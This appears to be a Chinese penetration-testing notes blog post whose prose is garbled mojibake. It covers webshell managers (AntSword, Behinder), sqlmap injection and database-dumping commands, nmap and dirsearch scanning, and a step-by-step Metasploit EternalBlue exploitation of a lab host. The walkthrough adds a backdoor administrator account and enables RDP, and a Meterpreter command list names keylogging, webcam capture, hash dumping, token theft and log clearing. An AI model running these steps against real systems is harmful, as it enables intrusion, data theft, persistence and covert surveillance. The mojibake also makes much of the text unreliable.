    <content><![CDATA[  <span id="more"></span>

<h2 id="èšå‰‘ä¸‹è½½"><a href="#èšå‰‘ä¸‹è½½" class="headerlink" title="èšå‰‘ä¸‹è½½"></a>èšå‰‘ä¸‹è½½</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gitee.com/AntSwordProject/AntSword-Loader</span><br></pre></td></tr></table></figure>

<h2 id="behinderä½¿ç”¨"><a href="#behinderä½¿ç”¨" class="headerlink" title="behinderä½¿ç”¨"></a>behinderä½¿ç”¨</h2><p>ä¸‹è½½åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder/releases</span><br></pre></td></tr></table></figure>

<p>ç”±äºè‡ªå·±å†windosä¸‹å¼„ä¸å¥½å†³å®šå¼„åˆ°kaliä¸Šï¼Œkaliæ²¡æœ‰javaç¯å¢ƒéœ€è¦é…ç½®javaç¯å¢ƒ</p>
<p>ä¸‹è½½è§£å‹ï¼Œåœ¨ç›®å½•é‡Œæ‰“å¼€ç»ˆç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure>

<p>behinder æ™®é€šçš„åé—¨æ˜¯ç”¨ä¸äº†åªèƒ½ç”¨behinderçš„åé—¨è¿æ¥</p>
<h2 id="sqlmapä½¿ç”¨"><a href="#sqlmapä½¿ç”¨" class="headerlink" title="sqlmapä½¿ç”¨"></a>sqlmapä½¿ç”¨</h2><p>sqlmapå¸¸ç”¨å‘½ä»¤æ€»ç»“ï¼š<br>æ³¨æ„ï¼šå‘½ä»¤ä¸ºkali linuxä¸­è¿è¡Œçš„ ï¼ˆwindowsä¸­ç”¨python sqlmap.pyæ‰§è¡Œï¼‰</p>
<p>1#ã€æ³¨å…¥å…­è¿ï¼š</p>
<ol>
<li><p>sqlmap -u  â€œ<a href="http://www.xx.com/?id=x">http://www.xx.com?id=x</a>â€œ    ã€æŸ¥è¯¢æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹</p>
</li>
<li><p>â€“dbs         ã€æ£€æµ‹ç«™ç‚¹åŒ…å«å“ªäº›æ•°æ®åº“</p>
</li>
<li><p>â€“current-db    ã€è·å–å½“å‰çš„æ•°æ®åº“å</p>
</li>
<li><p>â€“tables -D â€œdb_nameâ€  ã€è·å–æŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨å -Dåæ¥æŒ‡å®šçš„æ•°æ®åº“åç§°</p>
</li>
<li><p>â€“columns  -T â€œtable_nameâ€ -D â€œdb_nameâ€  ã€è·å–æ•°æ®åº“è¡¨ä¸­çš„å­—æ®µ</p>
</li>
<li><p>â€“dump -C â€œcolumns_nameâ€ -T â€œtable_nameâ€ -D â€œdb_nameâ€  ã€è·å–å­—æ®µçš„æ•°æ®å†…å®¹</p>
</li>
</ol>
<p>2#ã€COOKIEæ³¨å…¥ï¼š<br>sqlmap -u â€œ<a href="http://www.xx.com/?id=x">http://www.xx.com?id=x</a>â€œ â€“cookie â€œcookieâ€ â€“level 2  ã€cookieæ³¨å…¥ åæ¥cookieå€¼</p>
<p>3#ã€POSTæ³¨å…¥ï¼š<br>ï¼ˆ1ï¼‰ç›®æ ‡åœ°å€http:&#x2F;&#x2F; <a href="http://www.xxx.com/">www.xxx.com</a> &#x2F;login.asp<br>ï¼ˆ2ï¼‰æ‰“å¼€brupä»£ç†ã€‚<br>ï¼ˆ3ï¼‰ç‚¹å‡»è¡¨å•æäº¤<br>ï¼ˆ4ï¼‰burpè·å–æ‹¦æˆªä¿¡æ¯ï¼ˆpostï¼‰<br>ï¼ˆ5ï¼‰å³é”®ä¿å­˜æ–‡ä»¶ï¼ˆ.txtï¼‰åˆ°æŒ‡å®šç›®å½•ä¸‹<br>ï¼ˆ6ï¼‰è¿è¡Œsqlmapå¹¶æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š<br>ç”¨ä¾‹ï¼šsqlmap -r okay.txt  -p  username</p>
<p>&#x2F;&#x2F; -rè¡¨ç¤ºåŠ è½½æ–‡ä»¶(åŠæ­¥éª¤ï¼ˆ5ï¼‰ä¿å­˜çš„è·¯å¾„)ï¼Œ-pæŒ‡å®šå‚æ•°ï¼ˆå³æ‹¦æˆªçš„postè¯·æ±‚ä¸­è¡¨å•æäº¤çš„ç”¨æˆ·åæˆ–å¯†ç ç­‰nameå‚æ•°ï¼‰</p>
<p>ï¼ˆ7ï¼‰è‡ªåŠ¨è·å–è¡¨å•ï¼šâ€“formsè‡ªåŠ¨è·å–è¡¨å•</p>
<p>ä¾‹å¦‚ï¼šsqlmap -u <a href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> â€“forms</p>
<p>ï¼ˆ8ï¼‰æŒ‡å®šå‚æ•°æœç´¢ï¼šâ€“data</p>
<p>ä¾‹å¦‚:sqlmap -u <a href="http://www.xx.com/login.asp">www.xx.com/login.asp</a> â€“data â€œusername&#x3D;1â€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u æŒ‡å®šç›®æ ‡URL (å¯ä»¥æ˜¯httpåè®®ä¹Ÿå¯ä»¥æ˜¯httpsåè®®)</span><br><span class="line"> </span><br><span class="line">-d è¿æ¥æ•°æ®åº“</span><br><span class="line"> </span><br><span class="line">--dbs åˆ—å‡ºæ‰€æœ‰çš„æ•°æ®åº“</span><br><span class="line"> </span><br><span class="line">--current-db åˆ—å‡ºå½“å‰æ•°æ®åº“</span><br><span class="line"> </span><br><span class="line">--tables åˆ—å‡ºå½“å‰çš„è¡¨</span><br><span class="line"> </span><br><span class="line">--columns åˆ—å‡ºå½“å‰çš„åˆ—</span><br><span class="line"> </span><br><span class="line">-D é€‰æ‹©ä½¿ç”¨å“ªä¸ªæ•°æ®åº“</span><br><span class="line"> </span><br><span class="line">-T é€‰æ‹©ä½¿ç”¨å“ªä¸ªè¡¨</span><br><span class="line"> </span><br><span class="line">-C é€‰æ‹©ä½¿ç”¨å“ªä¸ªåˆ—</span><br><span class="line"> </span><br><span class="line">--dump è·å–å­—æ®µä¸­çš„æ•°æ®</span><br><span class="line"> </span><br><span class="line">--batch è‡ªåŠ¨é€‰æ‹©yes</span><br><span class="line"> </span><br><span class="line">--smart å¯å‘å¼å¿«é€Ÿåˆ¤æ–­ï¼ŒèŠ‚çº¦æµªè´¹æ—¶é—´</span><br><span class="line"> </span><br><span class="line">--forms å°è¯•ä½¿ç”¨postæ³¨å…¥</span><br><span class="line"> </span><br><span class="line">-r åŠ è½½æ–‡ä»¶ä¸­çš„HTTPè¯·æ±‚ï¼ˆæœ¬åœ°ä¿å­˜çš„è¯·æ±‚åŒ…txtæ–‡ä»¶ï¼‰</span><br><span class="line"> </span><br><span class="line">-l åŠ è½½æ–‡ä»¶ä¸­çš„HTTPè¯·æ±‚ï¼ˆæœ¬åœ°ä¿å­˜çš„è¯·æ±‚åŒ…æ—¥å¿—æ–‡ä»¶ï¼‰</span><br><span class="line"> </span><br><span class="line">-g è‡ªåŠ¨è·å–Googleæœç´¢çš„å‰ä¸€ç™¾ä¸ªç»“æœï¼Œå¯¹æœ‰GETå‚æ•°çš„URLæµ‹è¯•</span><br><span class="line"> </span><br><span class="line">-o å¼€å¯æ‰€æœ‰é»˜è®¤æ€§èƒ½ä¼˜åŒ–</span><br><span class="line"> </span><br><span class="line">--tamper è°ƒç”¨è„šæœ¬è¿›è¡Œæ³¨å…¥</span><br><span class="line"> </span><br><span class="line">-v æŒ‡å®šsqlmapçš„å›æ˜¾ç­‰çº§</span><br><span class="line"> </span><br><span class="line">--delay è®¾ç½®å¤šä¹…è®¿é—®ä¸€æ¬¡</span><br><span class="line"> </span><br><span class="line">--os-shell è·å–ä¸»æœºshellï¼Œä¸€èˆ¬ä¸å¤ªå¥½ç”¨ï¼Œå› ä¸ºæ²¡æƒé™</span><br><span class="line"> </span><br><span class="line">-m æ‰¹é‡æ“ä½œ</span><br><span class="line"> </span><br><span class="line">-c æŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œä¼šæŒ‰ç…§è¯¥é…ç½®æ–‡ä»¶æ‰§è¡ŒåŠ¨ä½œ</span><br><span class="line"> </span><br><span class="line">-data dataæŒ‡å®šçš„æ•°æ®ä¼šå½“åšpostæ•°æ®æäº¤</span><br><span class="line"> </span><br><span class="line">-timeout è®¾å®šè¶…æ—¶æ—¶é—´</span><br><span class="line"> </span><br><span class="line">--level è®¾ç½®æ³¨å…¥æ¢æµ‹ç­‰çº§</span><br><span class="line"> </span><br><span class="line">--risk é£é™©ç­‰çº§</span><br><span class="line"> </span><br><span class="line">--identify-waf æ£€æµ‹é˜²ç«å¢™ç±»å‹</span><br><span class="line"> </span><br><span class="line">--param-del=&quot;åˆ†å‰²ç¬¦&quot; è®¾ç½®å‚æ•°çš„åˆ†å‰²ç¬¦</span><br><span class="line"> </span><br><span class="line">--skip-urlencode ä¸è¿›è¡Œurlç¼–ç </span><br><span class="line"> </span><br><span class="line">--keep-alive è®¾ç½®æŒä¹…è¿æ¥ï¼ŒåŠ å¿«æ¢æµ‹é€Ÿåº¦</span><br><span class="line"> </span><br><span class="line">--null-connection æ£€ç´¢æ²¡æœ‰bodyå“åº”çš„å†…å®¹ï¼Œå¤šç”¨äºç›²æ³¨</span><br><span class="line"> </span><br><span class="line">--thread æœ€å¤§ä¸º10 è®¾ç½®å¤šçº¿ç¨‹</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/songbai220/article/details/109303110">(10æ¡æ¶ˆæ¯) sqlmapä½¿ç”¨æ•™ç¨‹(è¶…è¯¦ç»†)_Redmaple925çš„åšå®¢-CSDNåšå®¢</a></p>
<h2 id="nmapä½¿ç”¨"><a href="#nmapä½¿ç”¨" class="headerlink" title="nmapä½¿ç”¨"></a>nmapä½¿ç”¨</h2><p>nmapå¸¸ç”¨å‘½ä»¤<br>ä¸»æœºå‘ç° </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sL                     ä»…ä»…æ˜¯æ˜¾ç¤º,æ‰«æçš„IPæ•°ç›®,ä¸ä¼šè¿›è¡Œä»»ä½•æ‰«æ</span><br><span class="line">-sn                     pingæ‰«æ,å³ä¸»æœºå‘ç°</span><br><span class="line">-Pn                     ä¸æ£€æµ‹ä¸»æœºå­˜æ´»</span><br><span class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Pingå‘ç°</span><br><span class="line">-PE/PP/PM               ä½¿ç”¨ICMP echo, timestamp and netmask è¯·æ±‚åŒ…å‘ç°ä¸»æœº</span><br><span class="line">-PO[prococol list]      ä½¿ç”¨IPåè®®åŒ…æ¢æµ‹å¯¹æ–¹ä¸»æœºæ˜¯å¦å¼€å¯   </span><br><span class="line">-n/-R                   ä¸å¯¹IPè¿›è¡ŒåŸŸååå‘è§£æ/ä¸ºæ‰€æœ‰çš„IPéƒ½è¿›è¡ŒåŸŸåçš„åå“è§£æ</span><br></pre></td></tr></table></figure>

<p>awdä¸»æœºå‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=open(&#x27;pingtest.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">for i in range(255):</span><br><span class="line">    ip = &quot;192-168-1-&quot; + str(i) +&quot;.pvp2155.bugku.cn&quot;</span><br><span class="line">    f.write(ip+&#x27;\n&#x27;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>æ‰¹é‡æ‰«æå­˜è´§ä¸»æœº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -iL /home/zhou/æ¡Œé¢/pingtest.txt -sn</span><br></pre></td></tr></table></figure>



<h2 id="dirsearchä½¿ç”¨"><a href="#dirsearchä½¿ç”¨" class="headerlink" title="dirsearchä½¿ç”¨"></a>dirsearchä½¿ç”¨</h2><p>å¸¸ç”¨äºæš´åŠ›æ‰«æé¡µé¢ç»“æ„ï¼ŒåŒ…æ‹¬ç½‘é¡µä¸­çš„ç›®å½•å’Œæ–‡ä»¶</p>
<p>ç®€å•ä½¿ç”¨</p>
<p>-u,â€“url                    ç›®æ ‡url<br>-l,â€“url-list&#x3D;FILE          ç›®æ ‡urlæ–‡ä»¶è·¯å¾„<br>â€“stdin                     ä»æ ‡å‡†è¾“å…¥ä¸­æŒ‡å®šurl<br>â€“cidr                      ç›®æ ‡ç½‘æ®µ<br>â€“raw&#x3D;File                  ä»æ–‡ä»¶ä¸­è¯»å–requestæŠ¥æ–‡,é€šè¿‡-schemaæŒ‡å®šç­–ç•¥(å¦‚â€“schema https)</p>
<p><a href="https://so.csdn.net/so/search?q=dirsearch&t=&u=&urw=">dirsearch- CSDNæœç´¢</a> </p>
<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>æ°¸æ’ä¹‹è“</p>
<p>windos7é•œåƒä¸‹è½½</p>
<p><a href="https://www.imsdn.cn/windows-server/windows-server-2008-r2/">Windows Server 2008 R2 ISOé•œåƒä¸‹è½½ - æˆ‘çš„MSDN (imsdn.cn)</a></p>
<p>1.å¯åŠ¨msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p>2.æœç´¢å¯ä»¥ç”¨çš„æ¨¡æ¿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 3   #ä½¿ç”¨auxiliary/scanner/smb/smb_ms17_010  è¿›è¡Œæ‰«ææ˜¯å¦å­˜åœ¨MS17-010æ¼æ´</span><br><span class="line">show options   #æŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•°</span><br><span class="line">set rhosts 192.168.158.150</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<p>è‹¥å­˜åœ¨å¦‚ä¸Šå›¾æ‰€ç¤º</p>
<ol start="4">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use 0 #exploit/windows/smb/ms17_010_eternalblueæ˜¯æ°¸æ’ä¹‹è“æ”»å‡»ä»£ç </span><br><span class="line">show options   #æŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•°</span><br><span class="line">set rhosts 192.168.158.150 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>æ”»å‡»å®Œæˆ</p>
<p>5.æ˜¾ç¤º   win  å­—æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell    #è¿›å…¥å‘½ä»¤è¡Œ</span><br><span class="line">chcp 65001    ##åˆ‡æ¢ç¼–ç ï¼Œè§£å†³ä¹±ç é—®é¢˜</span><br><span class="line">exit   #ç¦»å¼€shell</span><br><span class="line">background #æŠŠæˆ‘ä»¬è·å¾—çš„meterpreterä¼šè¯æŒ‚è½½åˆ°åå°è¿è¡Œ</span><br><span class="line">sessions   #æ˜¾ç¤ºæ‰€æœ‰ä¼šè¯</span><br><span class="line">sessions id   #è¿›å…¥ä¼šè¯</span><br></pre></td></tr></table></figure>



<ol start="6">
<li></li>
</ol>
<p>1ã€åˆ›å»ºæ–°ç”¨æˆ· ï¼Œè¯­æ³•ï¼šnet user ç”¨æˆ·å å¯†ç  &#x2F;add</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user sss @123qwe /add</span><br><span class="line">net localgroup administrators sss /add  #å°†ç”¨æˆ·sssæ·»åŠ è‡³ç®¡ç†å‘˜ç»„</span><br></pre></td></tr></table></figure>

<p>7</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>

<p>8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdesktop 192.168.184.138</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Meterpreter &gt; ?</span><br><span class="line">==========================================</span><br><span class="line">æ ¸å¿ƒå‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             å¸®åŠ©èœå•</span><br><span class="line">background                    æŠŠå½“å‰ä¼šè¯æŒ‚åˆ°åå°è¿è¡Œ</span><br><span class="line">bg                            backgroundå‘½ä»¤çš„åˆ«å</span><br><span class="line">bgkill                        æ€æ­»åå°meterpreter è„šæœ¬</span><br><span class="line">bglist                        åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„åå°è„šæœ¬</span><br><span class="line">bgrun                         æ‰§è¡Œä¸€ä¸ªmeterpreterè„šæœ¬ä½œä¸ºåå°çº¿ç¨‹</span><br><span class="line">channel                       æ˜¾ç¤ºä¿¡æ¯æˆ–æ§åˆ¶æ´»åŠ¨é¢‘é“</span><br><span class="line">close                         å…³é—­ä¸€ä¸ªé¢‘é“</span><br><span class="line">detach                        åˆ†ç¦»Meterpreterä¼šè¯ï¼ˆç”¨äº http/httpsï¼‰</span><br><span class="line">disable_unicode_encoding      ç¦ç”¨ unicode å­—ç¬¦ä¸²çš„ç¼–ç </span><br><span class="line">enable_unicode_encoding       å¯ç”¨ unicode å­—ç¬¦ä¸²çš„ç¼–ç </span><br><span class="line">exit                          ç»ˆæ­¢ Meterpreter ä¼šè¯</span><br><span class="line">get_timeouts                  è·å–å½“å‰ä¼šè¯è¶…æ—¶å€¼</span><br><span class="line">guid                          è·å–ä¼šè¯ GUID</span><br><span class="line">help                          å¸®åŠ©èœå•</span><br><span class="line">info                          æ˜¾ç¤ºæœ‰å…³ Post æ¨¡å—çš„ä¿¡æ¯</span><br><span class="line">irb                           åœ¨å½“å‰ä¼šè¯ä¸­æ‰“å¼€ä¸€ä¸ªäº¤äº’å¼ Ruby shell</span><br><span class="line">load                          åŠ è½½ä¸€ä¸ªæˆ–å¤šä¸ª Meterpreter æ‰©å±•</span><br><span class="line">machine_id                    è·å–è¿æ¥åˆ°ä¼šè¯çš„æœºå™¨çš„ MSF ID</span><br><span class="line">migrate                       å°†æœåŠ¡å™¨è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹</span><br><span class="line">pivot                         ç®¡ç†æ¢è½´ä¾¦å¬å™¨</span><br><span class="line">pry                           åœ¨å½“å‰ä¼šè¯ä¸Šæ‰“å¼€ Pry è°ƒè¯•å™¨</span><br><span class="line">quit                          ç»ˆæ­¢ Meterpreter ä¼šè¯</span><br><span class="line">read                          ä»é€šé“è¯»å–æ•°æ®</span><br><span class="line">resource                      è¿è¡Œå­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„å‘½ä»¤</span><br><span class="line">run                           æ‰§è¡Œä¸€ä¸ª Meterpreter è„šæœ¬æˆ– Post æ¨¡å—</span><br><span class="line">secure                       ï¼ˆé‡æ–°ï¼‰åå•†ä¼šè¯ä¸Šçš„ TLV æ•°æ®åŒ…åŠ å¯†</span><br><span class="line">sessions                      å¿«é€Ÿåˆ‡æ¢åˆ°å¦ä¸€ä¸ªä¼šè¯</span><br><span class="line">set_timeouts                  è®¾ç½®å½“å‰ä¼šè¯è¶…æ—¶å€¼</span><br><span class="line">sleep                         å¼ºåˆ¶ Meterpreter å®‰é™ï¼Œç„¶åé‡æ–°å»ºç«‹ä¼šè¯</span><br><span class="line">ssl_verify                    ä¿®æ”¹ SSL è¯ä¹¦éªŒè¯è®¾ç½®</span><br><span class="line">transport                     ç®¡ç†è¿è¾“æœºåˆ¶</span><br><span class="line">use                           ä¸æ¨èä½¿ç”¨çš„loadå‘½ä»¤åˆ«å</span><br><span class="line">uuid                          è·å–å½“å‰ä¼šè¯çš„ UUID</span><br><span class="line">write                         å°†æ•°æ®å†™å…¥é€šé“</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šæ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">cat                           å°†æ–‡ä»¶å†…å®¹è¯»åˆ°å±å¹•ä¸Š</span><br><span class="line">cd                            åˆ‡æ¢ç›®å½•</span><br><span class="line">checksum                      æ£€ç´¢æ–‡ä»¶çš„æ ¡éªŒå’Œ</span><br><span class="line">cp                            å°†æºå¤åˆ¶åˆ°ç›®æ ‡</span><br><span class="line">del                           åˆ é™¤æŒ‡å®šæ–‡ä»¶</span><br><span class="line">dir                           åˆ—å‡ºæ–‡ä»¶ï¼ˆls çš„åˆ«åï¼‰</span><br><span class="line">download                      ä¸‹è½½æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">edit                          ç¼–è¾‘æ–‡ä»¶</span><br><span class="line">getlwd                        æ‰“å°æœ¬åœ°å·¥ä½œç›®å½•</span><br><span class="line">getwd                         æ‰“å°å·¥ä½œç›®å½•</span><br><span class="line">lcd                           æ›´æ”¹æœ¬åœ°å·¥ä½œç›®å½•</span><br><span class="line">lls                           åˆ—å‡ºæœ¬åœ°æ–‡ä»¶</span><br><span class="line">lpwd                          æ‰“å°æœ¬åœ°å·¥ä½œç›®å½•</span><br><span class="line">ls                            åˆ—å‡ºæ–‡ä»¶</span><br><span class="line">mkdir                         åˆ¶ä½œç›®å½•</span><br><span class="line">mv                            å°†æºç§»åŠ¨åˆ°ç›®æ ‡</span><br><span class="line">pwd                           æ‰“å°å·¥ä½œç›®å½•</span><br><span class="line">rm                            åˆ é™¤æŒ‡å®šæ–‡ä»¶</span><br><span class="line">rmdir                         åˆ é™¤ç›®å½•</span><br><span class="line">search                        æœç´¢æ–‡ä»¶</span><br><span class="line">show_mount                    åˆ—å‡ºæ‰€æœ‰æŒ‚è½½ç‚¹/é€»è¾‘é©±åŠ¨å™¨</span><br><span class="line">upload                        ä¸Šä¼ æ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç½‘ç»œå‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">arp                           æ˜¾ç¤ºä¸»æœº ARP ç¼“å­˜</span><br><span class="line">getproxy                      æ˜¾ç¤ºå½“å‰ä»£ç†é…ç½®</span><br><span class="line">ifconfig                      æ˜¾ç¤ºç•Œé¢</span><br><span class="line">ipconfig                      æ˜¾ç¤ºæ¥å£</span><br><span class="line">netstat                       æ˜¾ç¤ºç½‘ç»œè¿æ¥</span><br><span class="line">portfwd                       å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹æœåŠ¡</span><br><span class="line">resolve                       è§£æç›®æ ‡ä¸Šçš„ä¸€ç»„ä¸»æœºå</span><br><span class="line">route                         æŸ¥çœ‹å’Œä¿®æ”¹è·¯ç”±è¡¨</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç³»ç»Ÿå‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">clearev                       æ¸…é™¤äº‹ä»¶æ—¥å¿—</span><br><span class="line">drop_token                    æ”¾å¼ƒä»»ä½•æ´»åŠ¨çš„æ¨¡æ‹Ÿä»¤ç‰Œã€‚</span><br><span class="line">execute                       æ‰§è¡Œå‘½ä»¤</span><br><span class="line">getenv                        è·å–ä¸€ä¸ªæˆ–å¤šä¸ªç¯å¢ƒå˜é‡å€¼</span><br><span class="line">getpid                        è·å–å½“å‰è¿›ç¨‹æ ‡è¯†ç¬¦</span><br><span class="line">getprivs                      å°è¯•å¯ç”¨å½“å‰è¿›ç¨‹å¯ç”¨çš„æ‰€æœ‰æƒé™</span><br><span class="line">getid                         è·å–æœåŠ¡å™¨è¿è¡Œçš„ç”¨æˆ·çš„ SID</span><br><span class="line">getuid                        è·å–æœåŠ¡å™¨è¿è¡Œçš„ç”¨æˆ·</span><br><span class="line">kill                          ç»ˆæ­¢è¿›ç¨‹</span><br><span class="line">localtime                     æ˜¾ç¤ºç›®æ ‡ç³»ç»Ÿæœ¬åœ°æ—¥æœŸå’Œæ—¶é—´</span><br><span class="line">pgrep                         æŒ‰åç§°è¿‡æ»¤è¿›ç¨‹</span><br><span class="line">pkill                         æŒ‰åç§°ç»ˆæ­¢è¿›ç¨‹</span><br><span class="line">ps                            åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</span><br><span class="line">reboot                        é‡å¯è¿œç¨‹è®¡ç®—æœº</span><br><span class="line">reg                           ä¿®æ”¹è¿œç¨‹æ³¨å†Œè¡¨å¹¶ä¸ä¹‹äº¤äº’</span><br><span class="line">rev2self                      åœ¨è¿œç¨‹æœºå™¨ä¸Šè°ƒç”¨ RevertToSelf()</span><br><span class="line">shell                         æ”¾å…¥ç³»ç»Ÿå‘½ä»¤ shell</span><br><span class="line">shutdown                      å…³é—­è¿œç¨‹è®¡ç®—æœº</span><br><span class="line">steal_token                   å°è¯•ä»ç›®æ ‡è¿›ç¨‹çªƒå–æ¨¡æ‹Ÿä»¤ç‰Œ</span><br><span class="line">suspend                       æš‚åœæˆ–æ¢å¤è¿›ç¨‹åˆ—è¡¨</span><br><span class="line">sysinfo                       è·å–æœ‰å…³è¿œç¨‹ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œä¾‹å¦‚ OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç”¨æˆ·ç•Œé¢å‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">enumdesktops                  åˆ—å‡ºæ‰€æœ‰å¯è®¿é—®çš„æ¡Œé¢å’Œçª—å£ç«™</span><br><span class="line">getdesktop                    è·å–å½“å‰çš„meterpreteræ¡Œé¢</span><br><span class="line">idletime                      è¿”å›è¿œç¨‹ç”¨æˆ·ç©ºé—²çš„ç§’æ•°</span><br><span class="line">keyboard_send                 å‘é€å‡»é”®</span><br><span class="line">keyevent                      å‘é€æŒ‰é”®äº‹ä»¶</span><br><span class="line">keyscan_dump                  è½¬å‚¨å‡»é”®ç¼“å†²åŒº</span><br><span class="line">keyscan_start                 å¼€å§‹æ•è·å‡»é”®</span><br><span class="line">keyscan_stop                  åœæ­¢æ•è·å‡»é”®</span><br><span class="line">mouse                         å‘é€é¼ æ ‡äº‹ä»¶</span><br><span class="line">screenshare                   å®æ—¶è§‚çœ‹è¿œç¨‹ç”¨æˆ·æ¡Œé¢</span><br><span class="line">screenshot                    æŠ“å–äº¤äº’å¼æ¡Œé¢çš„æˆªå›¾</span><br><span class="line">setdesktop                    æ›´æ”¹meterpreterså½“å‰æ¡Œé¢</span><br><span class="line">uictl                         æ§åˆ¶ä¸€äº›ç”¨æˆ·ç•Œé¢ç»„ä»¶</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šç½‘ç»œæ‘„åƒå¤´å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">record_mic                    ä»é»˜è®¤éº¦å…‹é£å½•åˆ¶éŸ³é¢‘ X ç§’</span><br><span class="line">webcam_chat                   å¼€å§‹è§†é¢‘èŠå¤©</span><br><span class="line">webcam_list                   åˆ—å‡ºç½‘ç»œæ‘„åƒå¤´</span><br><span class="line">webcam_snap                   ä»æŒ‡å®šçš„ç½‘ç»œæ‘„åƒå¤´æ‹æ‘„å¿«ç…§</span><br><span class="line">webcam_stream                 ä»æŒ‡å®šçš„ç½‘ç»œæ‘„åƒå¤´æ’­æ”¾è§†é¢‘æµ</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šéŸ³é¢‘è¾“å‡ºå‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">play                          åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ’­æ”¾æ³¢å½¢éŸ³é¢‘æ–‡ä»¶ (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Privï¼šæƒé™æå‡å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">getsystem                     å°è¯•å°†æ‚¨çš„æƒé™æå‡åˆ°æœ¬åœ°ç³»ç»Ÿçš„æƒé™ã€‚</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Privï¼šå¯†ç æ•°æ®åº“å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">hashdump                      è½¬å‚¨ SAM æ•°æ®åº“çš„å†…å®¹</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Privï¼šTimestomp å‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">timestomp                     æ“ä½œæ–‡ä»¶ MACE å±æ€§</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

